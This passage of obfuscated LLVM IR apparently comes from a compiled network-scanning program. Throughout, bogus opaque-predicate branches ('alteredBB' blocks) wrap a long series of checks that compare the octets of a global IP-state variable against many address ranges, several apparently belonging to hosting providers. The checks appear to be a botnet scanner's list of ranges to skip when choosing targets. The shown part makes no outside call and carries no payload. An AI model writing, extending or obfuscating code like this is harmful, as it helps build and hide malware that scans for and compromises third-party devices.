  %1921 = mul i32 %1918, %1920
  %1922 = urem i32 %1921, 2
  %1923 = icmp eq i32 %1922, 0
  %1924 = icmp slt i32 %1919, 10
  %1925 = or i1 %1923, %1924
  br i1 %1925, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br i1 %1917, label %5234, label %1926

; <label>:1926:                                   ; preds = %originalBBpart2259, %1902, %1898
  %1927 = load i32, i32* @x.71
  %1928 = load i32, i32* @y.72
  %1929 = sub i32 %1927, 1
  %1930 = mul i32 %1927, %1929
  %1931 = urem i32 %1930, 2
  %1932 = icmp eq i32 %1931, 0
  %1933 = icmp slt i32 %1928, 10
  %1934 = or i1 %1932, %1933
  br i1 %1934, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %1926
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp eq i32 %1936, 199
  %1938 = load i32, i32* @x.71
  %1939 = load i32, i32* @y.72
  %1940 = sub i32 %1938, 1
  %1941 = mul i32 %1938, %1940
  %1942 = urem i32 %1941, 2
  %1943 = icmp eq i32 %1942, 0
  %1944 = icmp slt i32 %1939, 10
  %1945 = or i1 %1943, %1944
  br i1 %1945, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br i1 %1937, label %1946, label %1954

; <label>:1946:                                   ; preds = %originalBBpart2263
  %1947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1948 = zext i8 %1947 to i32
  %1949 = icmp sge i32 %1948, 121
  br i1 %1949, label %1950, label %1954

; <label>:1950:                                   ; preds = %1946
  %1951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1952 = zext i8 %1951 to i32
  %1953 = icmp slt i32 %1952, 254
  br i1 %1953, label %5234, label %1954

; <label>:1954:                                   ; preds = %1950, %1946, %originalBBpart2263
  %1955 = load i32, i32* @x.71
  %1956 = load i32, i32* @y.72
  %1957 = sub i32 %1955, 1
  %1958 = mul i32 %1955, %1957
  %1959 = urem i32 %1958, 2
  %1960 = icmp eq i32 %1959, 0
  %1961 = icmp slt i32 %1956, 10
  %1962 = or i1 %1960, %1961
  br i1 %1962, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %1954
  %1963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1964 = zext i8 %1963 to i32
  %1965 = icmp eq i32 %1964, 205
  %1966 = load i32, i32* @x.71
  %1967 = load i32, i32* @y.72
  %1968 = sub i32 %1966, 1
  %1969 = mul i32 %1966, %1968
  %1970 = urem i32 %1969, 2
  %1971 = icmp eq i32 %1970, 0
  %1972 = icmp slt i32 %1967, 10
  %1973 = or i1 %1971, %1972
  br i1 %1973, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br i1 %1965, label %1974, label %1982

; <label>:1974:                                   ; preds = %originalBBpart2267
  %1975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = icmp sge i32 %1976, 1
  br i1 %1977, label %1978, label %1982

; <label>:1978:                                   ; preds = %1974
  %1979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp slt i32 %1980, 118
  br i1 %1981, label %5234, label %1982

; <label>:1982:                                   ; preds = %1978, %1974, %originalBBpart2267
  %1983 = load i32, i32* @x.71
  %1984 = load i32, i32* @y.72
  %1985 = sub i32 %1983, 1
  %1986 = mul i32 %1983, %1985
  %1987 = urem i32 %1986, 2
  %1988 = icmp eq i32 %1987, 0
  %1989 = icmp slt i32 %1984, 10
  %1990 = or i1 %1988, %1989
  br i1 %1990, label %originalBB269, label %originalBB269alteredBB

originalBB269:                                    ; preds = %originalBB269alteredBB, %1982
  %1991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1992 = zext i8 %1991 to i32
  %1993 = icmp eq i32 %1992, 207
  %1994 = load i32, i32* @x.71
  %1995 = load i32, i32* @y.72
  %1996 = sub i32 %1994, 1
  %1997 = mul i32 %1994, %1996
  %1998 = urem i32 %1997, 2
  %1999 = icmp eq i32 %1998, 0
  %2000 = icmp slt i32 %1995, 10
  %2001 = or i1 %1999, %2000
  br i1 %2001, label %originalBBpart2271, label %originalBB269alteredBB

originalBBpart2271:                               ; preds = %originalBB269
  br i1 %1993, label %2002, label %2042

; <label>:2002:                                   ; preds = %originalBBpart2271
  %2003 = load i32, i32* @x.71
  %2004 = load i32, i32* @y.72
  %2005 = sub i32 %2003, 1
  %2006 = mul i32 %2003, %2005
  %2007 = urem i32 %2006, 2
  %2008 = icmp eq i32 %2007, 0
  %2009 = icmp slt i32 %2004, 10
  %2010 = or i1 %2008, %2009
  br i1 %2010, label %originalBB273, label %originalBB273alteredBB

originalBB273:                                    ; preds = %originalBB273alteredBB, %2002
  %2011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2012 = zext i8 %2011 to i32
  %2013 = icmp sge i32 %2012, 60
  %2014 = load i32, i32* @x.71
  %2015 = load i32, i32* @y.72
  %2016 = sub i32 %2014, 1
  %2017 = mul i32 %2014, %2016
  %2018 = urem i32 %2017, 2
  %2019 = icmp eq i32 %2018, 0
  %2020 = icmp slt i32 %2015, 10
  %2021 = or i1 %2019, %2020
  br i1 %2021, label %originalBBpart2275, label %originalBB273alteredBB

originalBBpart2275:                               ; preds = %originalBB273
  br i1 %2013, label %2022, label %2042

; <label>:2022:                                   ; preds = %originalBBpart2275
  %2023 = load i32, i32* @x.71
  %2024 = load i32, i32* @y.72
  %2025 = sub i32 %2023, 1
  %2026 = mul i32 %2023, %2025
  %2027 = urem i32 %2026, 2
  %2028 = icmp eq i32 %2027, 0
  %2029 = icmp slt i32 %2024, 10
  %2030 = or i1 %2028, %2029
  br i1 %2030, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %2022
  %2031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2032 = zext i8 %2031 to i32
  %2033 = icmp slt i32 %2032, 62
  %2034 = load i32, i32* @x.71
  %2035 = load i32, i32* @y.72
  %2036 = sub i32 %2034, 1
  %2037 = mul i32 %2034, %2036
  %2038 = urem i32 %2037, 2
  %2039 = icmp eq i32 %2038, 0
  %2040 = icmp slt i32 %2035, 10
  %2041 = or i1 %2039, %2040
  br i1 %2041, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br i1 %2033, label %5234, label %2042

; <label>:2042:                                   ; preds = %originalBBpart2279, %originalBBpart2275, %originalBBpart2271
  %2043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2044 = zext i8 %2043 to i32
  %2045 = icmp eq i32 %2044, 104
  br i1 %2045, label %2046, label %2054

; <label>:2046:                                   ; preds = %2042
  %2047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2048 = zext i8 %2047 to i32
  %2049 = icmp sge i32 %2048, 16
  br i1 %2049, label %2050, label %2054

; <label>:2050:                                   ; preds = %2046
  %2051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2052 = zext i8 %2051 to i32
  %2053 = icmp slt i32 %2052, 31
  br i1 %2053, label %5234, label %2054

; <label>:2054:                                   ; preds = %2050, %2046, %2042
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp eq i32 %2056, 188
  br i1 %2057, label %2058, label %2062

; <label>:2058:                                   ; preds = %2054
  %2059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp eq i32 %2060, 166
  br i1 %2061, label %5234, label %2062

; <label>:2062:                                   ; preds = %2058, %2054
  %2063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2064 = zext i8 %2063 to i32
  %2065 = icmp eq i32 %2064, 188
  br i1 %2065, label %2066, label %2086

; <label>:2066:                                   ; preds = %2062
  %2067 = load i32, i32* @x.71
  %2068 = load i32, i32* @y.72
  %2069 = sub i32 %2067, 1
  %2070 = mul i32 %2067, %2069
  %2071 = urem i32 %2070, 2
  %2072 = icmp eq i32 %2071, 0
  %2073 = icmp slt i32 %2068, 10
  %2074 = or i1 %2072, %2073
  br i1 %2074, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %2066
  %2075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2076 = zext i8 %2075 to i32
  %2077 = icmp eq i32 %2076, 226
  %2078 = load i32, i32* @x.71
  %2079 = load i32, i32* @y.72
  %2080 = sub i32 %2078, 1
  %2081 = mul i32 %2078, %2080
  %2082 = urem i32 %2081, 2
  %2083 = icmp eq i32 %2082, 0
  %2084 = icmp slt i32 %2079, 10
  %2085 = or i1 %2083, %2084
  br i1 %2085, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  br i1 %2077, label %5234, label %2086

; <label>:2086:                                   ; preds = %originalBBpart2283, %2062
  %2087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2088 = zext i8 %2087 to i32
  %2089 = icmp eq i32 %2088, 159
  br i1 %2089, label %2090, label %2094

; <label>:2090:                                   ; preds = %2086
  %2091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = icmp eq i32 %2092, 203
  br i1 %2093, label %5234, label %2094

; <label>:2094:                                   ; preds = %2090, %2086
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp eq i32 %2096, 162
  br i1 %2097, label %2098, label %2102

; <label>:2098:                                   ; preds = %2094
  %2099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp eq i32 %2100, 243
  br i1 %2101, label %5234, label %2102

; <label>:2102:                                   ; preds = %2098, %2094
  %2103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2104 = zext i8 %2103 to i32
  %2105 = icmp eq i32 %2104, 45
  br i1 %2105, label %2106, label %2110

; <label>:2106:                                   ; preds = %2102
  %2107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2108 = zext i8 %2107 to i32
  %2109 = icmp eq i32 %2108, 55
  br i1 %2109, label %5234, label %2110

; <label>:2110:                                   ; preds = %2106, %2102
  %2111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2112 = zext i8 %2111 to i32
  %2113 = icmp eq i32 %2112, 178
  br i1 %2113, label %2114, label %2118

; <label>:2114:                                   ; preds = %2110
  %2115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2116 = zext i8 %2115 to i32
  %2117 = icmp eq i32 %2116, 62
  br i1 %2117, label %5234, label %2118

; <label>:2118:                                   ; preds = %2114, %2110
  %2119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2120 = zext i8 %2119 to i32
  %2121 = icmp eq i32 %2120, 104
  br i1 %2121, label %2122, label %2126

; <label>:2122:                                   ; preds = %2118
  %2123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2124 = zext i8 %2123 to i32
  %2125 = icmp eq i32 %2124, 131
  br i1 %2125, label %5234, label %2126

; <label>:2126:                                   ; preds = %2122, %2118
  %2127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2128 = zext i8 %2127 to i32
  %2129 = icmp eq i32 %2128, 104
  br i1 %2129, label %2130, label %2150

; <label>:2130:                                   ; preds = %2126
  %2131 = load i32, i32* @x.71
  %2132 = load i32, i32* @y.72
  %2133 = sub i32 %2131, 1
  %2134 = mul i32 %2131, %2133
  %2135 = urem i32 %2134, 2
  %2136 = icmp eq i32 %2135, 0
  %2137 = icmp slt i32 %2132, 10
  %2138 = or i1 %2136, %2137
  br i1 %2138, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %2130
  %2139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2140 = zext i8 %2139 to i32
  %2141 = icmp eq i32 %2140, 236
  %2142 = load i32, i32* @x.71
  %2143 = load i32, i32* @y.72
  %2144 = sub i32 %2142, 1
  %2145 = mul i32 %2142, %2144
  %2146 = urem i32 %2145, 2
  %2147 = icmp eq i32 %2146, 0
  %2148 = icmp slt i32 %2143, 10
  %2149 = or i1 %2147, %2148
  br i1 %2149, label %originalBBpart2287, label %originalBB285alteredBB

originalBBpart2287:                               ; preds = %originalBB285
  br i1 %2141, label %5234, label %2150

; <label>:2150:                                   ; preds = %originalBBpart2287, %2126
  %2151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2152 = zext i8 %2151 to i32
  %2153 = icmp eq i32 %2152, 107
  br i1 %2153, label %2154, label %2174

; <label>:2154:                                   ; preds = %2150
  %2155 = load i32, i32* @x.71
  %2156 = load i32, i32* @y.72
  %2157 = sub i32 %2155, 1
  %2158 = mul i32 %2155, %2157
  %2159 = urem i32 %2158, 2
  %2160 = icmp eq i32 %2159, 0
  %2161 = icmp slt i32 %2156, 10
  %2162 = or i1 %2160, %2161
  br i1 %2162, label %originalBB289, label %originalBB289alteredBB

originalBB289:                                    ; preds = %originalBB289alteredBB, %2154
  %2163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2164 = zext i8 %2163 to i32
  %2165 = icmp eq i32 %2164, 170
  %2166 = load i32, i32* @x.71
  %2167 = load i32, i32* @y.72
  %2168 = sub i32 %2166, 1
  %2169 = mul i32 %2166, %2168
  %2170 = urem i32 %2169, 2
  %2171 = icmp eq i32 %2170, 0
  %2172 = icmp slt i32 %2167, 10
  %2173 = or i1 %2171, %2172
  br i1 %2173, label %originalBBpart2291, label %originalBB289alteredBB

originalBBpart2291:                               ; preds = %originalBB289
  br i1 %2165, label %5234, label %2174

; <label>:2174:                                   ; preds = %originalBBpart2291, %2150
  %2175 = load i32, i32* @x.71
  %2176 = load i32, i32* @y.72
  %2177 = sub i32 %2175, 1
  %2178 = mul i32 %2175, %2177
  %2179 = urem i32 %2178, 2
  %2180 = icmp eq i32 %2179, 0
  %2181 = icmp slt i32 %2176, 10
  %2182 = or i1 %2180, %2181
  br i1 %2182, label %originalBB293, label %originalBB293alteredBB

originalBB293:                                    ; preds = %originalBB293alteredBB, %2174
  %2183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2184 = zext i8 %2183 to i32
  %2185 = icmp eq i32 %2184, 138
  %2186 = load i32, i32* @x.71
  %2187 = load i32, i32* @y.72
  %2188 = sub i32 %2186, 1
  %2189 = mul i32 %2186, %2188
  %2190 = urem i32 %2189, 2
  %2191 = icmp eq i32 %2190, 0
  %2192 = icmp slt i32 %2187, 10
  %2193 = or i1 %2191, %2192
  br i1 %2193, label %originalBBpart2295, label %originalBB293alteredBB

originalBBpart2295:                               ; preds = %originalBB293
  br i1 %2185, label %2194, label %2198

; <label>:2194:                                   ; preds = %originalBBpart2295
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp eq i32 %2196, 197
  br i1 %2197, label %5234, label %2198

; <label>:2198:                                   ; preds = %2194, %originalBBpart2295
  %2199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2200 = zext i8 %2199 to i32
  %2201 = icmp eq i32 %2200, 138
  br i1 %2201, label %2202, label %2206

; <label>:2202:                                   ; preds = %2198
  %2203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2204 = zext i8 %2203 to i32
  %2205 = icmp eq i32 %2204, 68
  br i1 %2205, label %5234, label %2206

; <label>:2206:                                   ; preds = %2202, %2198
  %2207 = load i32, i32* @x.71
  %2208 = load i32, i32* @y.72
  %2209 = sub i32 %2207, 1
  %2210 = mul i32 %2207, %2209
  %2211 = urem i32 %2210, 2
  %2212 = icmp eq i32 %2211, 0
  %2213 = icmp slt i32 %2208, 10
  %2214 = or i1 %2212, %2213
  br i1 %2214, label %originalBB297, label %originalBB297alteredBB

originalBB297:                                    ; preds = %originalBB297alteredBB, %2206
  %2215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = icmp eq i32 %2216, 139
  %2218 = load i32, i32* @x.71
  %2219 = load i32, i32* @y.72
  %2220 = sub i32 %2218, 1
  %2221 = mul i32 %2218, %2220
  %2222 = urem i32 %2221, 2
  %2223 = icmp eq i32 %2222, 0
  %2224 = icmp slt i32 %2219, 10
  %2225 = or i1 %2223, %2224
  br i1 %2225, label %originalBBpart2299, label %originalBB297alteredBB

originalBBpart2299:                               ; preds = %originalBB297
  br i1 %2217, label %2226, label %2246

; <label>:2226:                                   ; preds = %originalBBpart2299
  %2227 = load i32, i32* @x.71
  %2228 = load i32, i32* @y.72
  %2229 = sub i32 %2227, 1
  %2230 = mul i32 %2227, %2229
  %2231 = urem i32 %2230, 2
  %2232 = icmp eq i32 %2231, 0
  %2233 = icmp slt i32 %2228, 10
  %2234 = or i1 %2232, %2233
  br i1 %2234, label %originalBB301, label %originalBB301alteredBB

originalBB301:                                    ; preds = %originalBB301alteredBB, %2226
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 59
  %2238 = load i32, i32* @x.71
  %2239 = load i32, i32* @y.72
  %2240 = sub i32 %2238, 1
  %2241 = mul i32 %2238, %2240
  %2242 = urem i32 %2241, 2
  %2243 = icmp eq i32 %2242, 0
  %2244 = icmp slt i32 %2239, 10
  %2245 = or i1 %2243, %2244
  br i1 %2245, label %originalBBpart2303, label %originalBB301alteredBB

originalBBpart2303:                               ; preds = %originalBB301
  br i1 %2237, label %5234, label %2246

; <label>:2246:                                   ; preds = %originalBBpart2303, %originalBBpart2299
  %2247 = load i32, i32* @x.71
  %2248 = load i32, i32* @y.72
  %2249 = sub i32 %2247, 1
  %2250 = mul i32 %2247, %2249
  %2251 = urem i32 %2250, 2
  %2252 = icmp eq i32 %2251, 0
  %2253 = icmp slt i32 %2248, 10
  %2254 = or i1 %2252, %2253
  br i1 %2254, label %originalBB305, label %originalBB305alteredBB

originalBB305:                                    ; preds = %originalBB305alteredBB, %2246
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 146
  %2258 = load i32, i32* @x.71
  %2259 = load i32, i32* @y.72
  %2260 = sub i32 %2258, 1
  %2261 = mul i32 %2258, %2260
  %2262 = urem i32 %2261, 2
  %2263 = icmp eq i32 %2262, 0
  %2264 = icmp slt i32 %2259, 10
  %2265 = or i1 %2263, %2264
  br i1 %2265, label %originalBBpart2307, label %originalBB305alteredBB

originalBBpart2307:                               ; preds = %originalBB305
  br i1 %2257, label %2266, label %2310

; <label>:2266:                                   ; preds = %originalBBpart2307
  %2267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2268 = zext i8 %2267 to i32
  %2269 = icmp eq i32 %2268, 185
  br i1 %2269, label %2270, label %2310

; <label>:2270:                                   ; preds = %2266
  %2271 = load i32, i32* @x.71
  %2272 = load i32, i32* @y.72
  %2273 = sub i32 %2271, 1
  %2274 = mul i32 %2271, %2273
  %2275 = urem i32 %2274, 2
  %2276 = icmp eq i32 %2275, 0
  %2277 = icmp slt i32 %2272, 10
  %2278 = or i1 %2276, %2277
  br i1 %2278, label %originalBB309, label %originalBB309alteredBB

originalBB309:                                    ; preds = %originalBB309alteredBB, %2270
  %2279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2280 = zext i8 %2279 to i32
  %2281 = icmp sge i32 %2280, 128
  %2282 = load i32, i32* @x.71
  %2283 = load i32, i32* @y.72
  %2284 = sub i32 %2282, 1
  %2285 = mul i32 %2282, %2284
  %2286 = urem i32 %2285, 2
  %2287 = icmp eq i32 %2286, 0
  %2288 = icmp slt i32 %2283, 10
  %2289 = or i1 %2287, %2288
  br i1 %2289, label %originalBBpart2311, label %originalBB309alteredBB

originalBBpart2311:                               ; preds = %originalBB309
  br i1 %2281, label %2290, label %2310

; <label>:2290:                                   ; preds = %originalBBpart2311
  %2291 = load i32, i32* @x.71
  %2292 = load i32, i32* @y.72
  %2293 = sub i32 %2291, 1
  %2294 = mul i32 %2291, %2293
  %2295 = urem i32 %2294, 2
  %2296 = icmp eq i32 %2295, 0
  %2297 = icmp slt i32 %2292, 10
  %2298 = or i1 %2296, %2297
  br i1 %2298, label %originalBB313, label %originalBB313alteredBB

originalBB313:                                    ; preds = %originalBB313alteredBB, %2290
  %2299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2300 = zext i8 %2299 to i32
  %2301 = icmp slt i32 %2300, 191
  %2302 = load i32, i32* @x.71
  %2303 = load i32, i32* @y.72
  %2304 = sub i32 %2302, 1
  %2305 = mul i32 %2302, %2304
  %2306 = urem i32 %2305, 2
  %2307 = icmp eq i32 %2306, 0
  %2308 = icmp slt i32 %2303, 10
  %2309 = or i1 %2307, %2308
  br i1 %2309, label %originalBBpart2315, label %originalBB313alteredBB

originalBBpart2315:                               ; preds = %originalBB313
  br i1 %2301, label %5234, label %2310

; <label>:2310:                                   ; preds = %originalBBpart2315, %originalBBpart2311, %2266, %originalBBpart2307
  %2311 = load i32, i32* @x.71
  %2312 = load i32, i32* @y.72
  %2313 = sub i32 %2311, 1
  %2314 = mul i32 %2311, %2313
  %2315 = urem i32 %2314, 2
  %2316 = icmp eq i32 %2315, 0
  %2317 = icmp slt i32 %2312, 10
  %2318 = or i1 %2316, %2317
  br i1 %2318, label %originalBB317, label %originalBB317alteredBB

originalBB317:                                    ; preds = %originalBB317alteredBB, %2310
  %2319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2320 = zext i8 %2319 to i32
  %2321 = icmp eq i32 %2320, 163
  %2322 = load i32, i32* @x.71
  %2323 = load i32, i32* @y.72
  %2324 = sub i32 %2322, 1
  %2325 = mul i32 %2322, %2324
  %2326 = urem i32 %2325, 2
  %2327 = icmp eq i32 %2326, 0
  %2328 = icmp slt i32 %2323, 10
  %2329 = or i1 %2327, %2328
  br i1 %2329, label %originalBBpart2319, label %originalBB317alteredBB

originalBBpart2319:                               ; preds = %originalBB317
  br i1 %2321, label %2330, label %2358

; <label>:2330:                                   ; preds = %originalBBpart2319
  %2331 = load i32, i32* @x.71
  %2332 = load i32, i32* @y.72
  %2333 = sub i32 %2331, 1
  %2334 = mul i32 %2331, %2333
  %2335 = urem i32 %2334, 2
  %2336 = icmp eq i32 %2335, 0
  %2337 = icmp slt i32 %2332, 10
  %2338 = or i1 %2336, %2337
  br i1 %2338, label %originalBB321, label %originalBB321alteredBB

originalBB321:                                    ; preds = %originalBB321alteredBB, %2330
  %2339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2340 = zext i8 %2339 to i32
  %2341 = icmp eq i32 %2340, 47
  %2342 = load i32, i32* @x.71
  %2343 = load i32, i32* @y.72
  %2344 = sub i32 %2342, 1
  %2345 = mul i32 %2342, %2344
  %2346 = urem i32 %2345, 2
  %2347 = icmp eq i32 %2346, 0
  %2348 = icmp slt i32 %2343, 10
  %2349 = or i1 %2347, %2348
  br i1 %2349, label %originalBBpart2323, label %originalBB321alteredBB

originalBBpart2323:                               ; preds = %originalBB321
  br i1 %2341, label %2350, label %2358

; <label>:2350:                                   ; preds = %originalBBpart2323
  %2351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2352 = zext i8 %2351 to i32
  %2353 = icmp sge i32 %2352, 10
  br i1 %2353, label %2354, label %2358

; <label>:2354:                                   ; preds = %2350
  %2355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2356 = zext i8 %2355 to i32
  %2357 = icmp slt i32 %2356, 11
  br i1 %2357, label %5234, label %2358

; <label>:2358:                                   ; preds = %2354, %2350, %originalBBpart2323, %originalBBpart2319
  %2359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2360 = zext i8 %2359 to i32
  %2361 = icmp eq i32 %2360, 174
  br i1 %2361, label %2362, label %2390

; <label>:2362:                                   ; preds = %2358
  %2363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2364 = zext i8 %2363 to i32
  %2365 = icmp eq i32 %2364, 138
  br i1 %2365, label %2366, label %2390

; <label>:2366:                                   ; preds = %2362
  %2367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2368 = zext i8 %2367 to i32
  %2369 = icmp sge i32 %2368, 1
  br i1 %2369, label %2370, label %2390

; <label>:2370:                                   ; preds = %2366
  %2371 = load i32, i32* @x.71
  %2372 = load i32, i32* @y.72
  %2373 = sub i32 %2371, 1
  %2374 = mul i32 %2371, %2373
  %2375 = urem i32 %2374, 2
  %2376 = icmp eq i32 %2375, 0
  %2377 = icmp slt i32 %2372, 10
  %2378 = or i1 %2376, %2377
  br i1 %2378, label %originalBB325, label %originalBB325alteredBB

originalBB325:                                    ; preds = %originalBB325alteredBB, %2370
  %2379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2380 = zext i8 %2379 to i32
  %2381 = icmp slt i32 %2380, 127
  %2382 = load i32, i32* @x.71
  %2383 = load i32, i32* @y.72
  %2384 = sub i32 %2382, 1
  %2385 = mul i32 %2382, %2384
  %2386 = urem i32 %2385, 2
  %2387 = icmp eq i32 %2386, 0
  %2388 = icmp slt i32 %2383, 10
  %2389 = or i1 %2387, %2388
  br i1 %2389, label %originalBBpart2327, label %originalBB325alteredBB

originalBBpart2327:                               ; preds = %originalBB325
  br i1 %2381, label %5234, label %2390

; <label>:2390:                                   ; preds = %originalBBpart2327, %2366, %2362, %2358
  %2391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2392 = zext i8 %2391 to i32
  %2393 = icmp eq i32 %2392, 192
  br i1 %2393, label %2394, label %2406

; <label>:2394:                                   ; preds = %2390
  %2395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2396 = zext i8 %2395 to i32
  %2397 = icmp eq i32 %2396, 241
  br i1 %2397, label %2398, label %2406

; <label>:2398:                                   ; preds = %2394
  %2399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2400 = zext i8 %2399 to i32
  %2401 = icmp sge i32 %2400, 128
  br i1 %2401, label %2402, label %2406

; <label>:2402:                                   ; preds = %2398
  %2403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2404 = zext i8 %2403 to i32
  %2405 = icmp slt i32 %2404, 255
  br i1 %2405, label %5234, label %2406

; <label>:2406:                                   ; preds = %2402, %2398, %2394, %2390
  %2407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2408 = zext i8 %2407 to i32
  %2409 = icmp eq i32 %2408, 198
